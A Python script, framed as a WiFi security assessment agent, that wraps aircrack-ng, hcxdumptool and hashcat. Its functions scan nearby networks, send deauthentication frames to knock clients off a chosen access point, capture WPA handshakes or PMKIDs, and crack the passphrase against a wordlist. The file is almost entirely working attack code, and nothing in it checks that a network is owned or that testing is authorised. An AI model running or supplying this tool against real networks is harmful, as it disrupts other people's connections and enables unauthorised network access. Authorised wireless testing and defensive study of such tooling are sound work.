#!/usr/bin/env python3
"""WiFi password cracking assessment agent using aircrack-ng subprocess wrappers."""

import subprocess
import sys
import os
import re
import time
import signal
from datetime import datetime


def check_tools():
    """Verify required tools are installed."""
    tools = {}
    for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat"]:
        result = subprocess.run(
            ["which", tool], capture_output=True, text=True
        )
        tools[tool] = result.stdout.strip() if result.returncode == 0 else None
    return tools


def list_interfaces():
    """List wireless interfaces."""
    result = subprocess.run(
        ["iw", "dev"], capture_output=True, text=True
    )
    interfaces = re.findall(r"Interface\s+(\S+)", result.stdout)
    return interfaces


def enable_monitor_mode(iface="wlan0"):
    """Enable monitor mode on wireless interface."""
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(
        ["airmon-ng", "start", iface], capture_output=True, text=True
    )
    mon_match = re.search(r"monitor mode .* enabled on (\S+)", result.stdout)
    mon_iface = mon_match.group(1) if mon_match else f"{iface}mon"
    return {"monitor_interface": mon_iface, "output": result.stdout.strip()}


def scan_networks(mon_iface="wlan0mon", duration=15, output_prefix="/tmp/scan"):
    """Scan for nearby wireless networks."""
    proc = subprocess.Popen(
        ["airodump-ng", mon_iface, "-w", output_prefix, "--output-format", "csv"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    csv_file = f"{output_prefix}-01.csv"
    networks = []
    if os.path.exists(csv_file):
        with open(csv_file, "r", errors="ignore") as f:
            lines = f.readlines()
        in_ap_section = True
        for line in lines[2:]:
            if not line.strip() or "Station MAC" in line:
                in_ap_section = False
                continue
            if not in_ap_section:
                continue
            fields = [f.strip() for f in line.split(",")]
            if len(fields) >= 14:
                bssid = fields[0]
                channel = fields[3]
                encryption = fields[5]
                essid = fields[13]
                power = fields[8]
                if bssid and len(bssid) == 17:
                    networks.append({
                        "bssid": bssid, "channel": channel,
                        "encryption": encryption, "essid": essid,
                        "power": power,
                    })
    return networks


def capture_handshake(mon_iface, bssid, channel, output_prefix="/tmp/handshake",
                      timeout=120):
    """Capture WPA handshake from target network."""
    proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", output_prefix, mon_iface],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(5)
    subprocess.run(
        ["aireplay-ng", "-0", "5", "-a", bssid, mon_iface],
        capture_output=True, timeout=30
    )
    time.sleep(timeout)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    cap_file = f"{output_prefix}-01.cap"
    handshake_captured = False
    if os.path.exists(cap_file):
        check = subprocess.run(
            ["aircrack-ng", cap_file], capture_output=True, text=True, timeout=10
        )
        if "1 handshake" in check.stdout:
            handshake_captured = True
    return {
        "capture_file": cap_file,
        "handshake_captured": handshake_captured,
        "bssid": bssid,
        "channel": channel,
    }


def try_pmkid_capture(mon_iface, bssid, channel, timeout=30):
    """Attempt PMKID capture using hcxdumptool."""
    output_file = "/tmp/pmkid.pcapng"
    try:
        proc = subprocess.Popen(
            ["hcxdumptool", "-i", mon_iface, "-o", output_file,
             "--enable_status=1", "--filtermode=2",
             f"--filterlist_ap={bssid}"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(timeout)
        proc.send_signal(signal.SIGINT)
        proc.wait()
        hash_file = "/tmp/pmkid_hash.txt"
        subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, output_file],
            capture_output=True
        )
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            return {"pmkid_captured": True, "hash_file": hash_file}
    except FileNotFoundError:
        pass
    return {"pmkid_captured": False}


def crack_with_aircrack(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
    """Crack WPA handshake using aircrack-ng with wordlist."""
    if not os.path.exists(wordlist):
        return {"error": f"Wordlist not found: {wordlist}"}
    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wordlist],
        capture_output=True, text=True, timeout=3600
    )
    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
    if key_match:
        return {"cracked": True, "key": key_match.group(1), "tool": "aircrack-ng"}
    return {"cracked": False, "tool": "aircrack-ng"}


def crack_with_hashcat(hash_file, wordlist="/usr/share/wordlists/rockyou.txt",
                       hash_mode=22000):
    """Crack WPA hash using hashcat with GPU acceleration."""
    if not os.path.exists(wordlist):
        return {"error": f"Wordlist not found: {wordlist}"}
    try:
        result = subprocess.run(
            ["hashcat", "-m", str(hash_mode), hash_file, wordlist,
             "--force", "-o", "/tmp/hashcat_cracked.txt"],
            capture_output=True, text=True, timeout=7200
        )
        cracked_file = "/tmp/hashcat_cracked.txt"
        if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
            with open(cracked_file) as f:
                return {"cracked": True, "result": f.read().strip(), "tool": "hashcat"}
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return {"cracked": False, "tool": "hashcat"}


def disable_monitor_mode(mon_iface="wlan0mon"):
    """Disable monitor mode and restore managed mode."""
    subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
    subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
    return {"restored": True}


def print_report(networks, handshake, crack_result):
    print("WiFi Security Assessment Report")
    print("=" * 50)
    print(f"Date: {datetime.now().isoformat()}")
    print(f"\nNetworks Discovered: {len(networks)}")
    for n in networks[:10]:
        print(f"  {n['essid']:25s} {n['bssid']} ch:{n['channel']:>3s} {n['encryption']}")
    print(f"\nHandshake Capture: {'SUCCESS' if handshake.get('handshake_captured') else 'FAILED'}")
    print(f"  BSSID: {handshake.get('bssid')}")
    print(f"  File: {handshake.get('capture_file')}")
    if crack_result:
        if crack_result.get("cracked"):
            print(f"\nPassword Cracked: YES")
            print(f"  Key: {crack_result.get('key', crack_result.get('result', 'N/A'))}")
            print(f"  Tool: {crack_result['tool']}")
            print(f"  Risk: CRITICAL - Weak passphrase")
        else:
            print(f"\nPassword Cracked: NO (passphrase resists dictionary attack)")


if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    tools = check_tools()
    missing = [t for t, p in tools.items() if not p]
    if missing:
        print(f"Missing tools: {', '.join(missing)}")
        sys.exit(1)
    print(f"Starting WiFi assessment on {iface}...")
